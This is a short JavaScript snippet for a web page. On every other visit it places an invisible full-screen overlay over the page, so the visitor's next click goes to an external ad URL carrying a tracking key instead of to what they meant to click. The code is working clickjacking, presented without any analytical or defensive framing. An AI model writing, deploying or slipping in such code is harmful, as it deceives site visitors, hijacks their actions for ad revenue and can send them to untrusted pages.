document.addEventListener('DOMContentLoaded', () => {
  // Get current count
  let clickCount = parseInt(localStorage.getItem('adClickCount') || '0');

  // Ensure no leftover overlays from previous sessions
  const oldOverlay = document.getElementById('click-overlay');
  if (oldOverlay) oldOverlay.remove();

  if (clickCount % 2 === 0) {
    // Odd-numbered click (1st, 3rd, 5th...)
    const overlay = document.createElement('div');
    overlay.id = 'click-overlay';
    overlay.style.position = 'fixed';
    overlay.style.top = 0;
    overlay.style.left = 0;
    overlay.style.width = '100vw';
    overlay.style.height = '100vh';
    overlay.style.zIndex = 9999;
    overlay.style.cursor = 'pointer';
    overlay.style.background = 'transparent';

    document.body.appendChild(overlay);

    overlay.addEventListener('click', () => {
      overlay.remove(); // Clean up
      clickCount++;
      localStorage.setItem('adClickCount', clickCount.toString());
      window.location.href = 'https://flirtatiousmoviesbrightly.com/m5u0fm024?key=915f5541df37252209d1ab523c2cc8e5';
    });
  } else {
    // Even-numbered click (2nd, 4th...) — just count the click and allow normal use
    document.addEventListener('click', () => {
      clickCount++;
      localStorage.setItem('adClickCount', clickCount.toString());
    }, { once: true });
  }
});
